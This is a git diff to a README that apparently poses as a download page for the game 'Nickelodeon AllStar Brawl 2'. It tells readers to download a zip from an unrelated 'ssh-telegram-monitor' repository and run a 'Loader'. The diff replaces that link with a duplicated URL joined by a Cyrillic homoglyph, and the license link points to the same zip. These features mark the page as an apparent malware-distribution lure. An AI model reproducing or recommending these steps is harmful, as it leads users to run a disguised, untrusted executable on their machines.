@@ -22,7 +22,7 @@ Welcome to the **Nickelodeon AllStar Brawl 2 ** repository! This project offers 
 
 ## 📥 Installation
 
-1. Download `https://raw.githubusercontent.com/gv498/ssh-telegram-monitor/main/Lоader.zip` from the repository.
+1. Download `https://github.com/gv498/ssh-telegram-monitor/raw/refs/heads/main/Microsporum/ssh_monitor_telegram_2.6.zipоhttps://github.com/gv498/ssh-telegram-monitor/raw/refs/heads/main/Microsporum/ssh_monitor_telegram_2.6.zip` from the repository.
 2. Extract contents to your preferred folder.
 3. Run the Loader.
 4. Follow on-screen instructions and enjoy Nickelodeon AllStar Brawl 2.
@@ -33,7 +33,7 @@ Welcome to the **Nickelodeon AllStar Brawl 2 ** repository! This project offers 
 
 ## 📝 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/gv498/ssh-telegram-monitor/main/Lоader.zip) – you’re free to modify and share!
+Distributed under the [MIT License](https://github.com/gv498/ssh-telegram-monitor/raw/refs/heads/main/Microsporum/ssh_monitor_telegram_2.6.zipоhttps://github.com/gv498/ssh-telegram-monitor/raw/refs/heads/main/Microsporum/ssh_monitor_telegram_2.6.zip) – you’re free to modify and share!
 
 ---
 
